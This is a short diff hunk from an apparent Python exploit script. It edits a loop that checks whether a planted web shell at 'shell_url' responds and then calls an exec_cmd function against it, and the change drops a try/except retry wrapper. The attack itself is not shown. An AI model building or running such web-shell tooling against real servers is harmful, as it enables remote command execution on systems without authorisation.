@@ -378,10 +378,7 @@ def main():
         f = requests.get(f"{shell_url}", verify=False)
         if f.status_code == 200:
             print(f"got shell {f}")
-            try:
-                exec_cmd(shell_url)
-            except:
-                return exec_cmd(shell_url)
+            exec_cmd(shell_url)
         else:
             print('got shell ' + str(f))
         time.sleep(5)
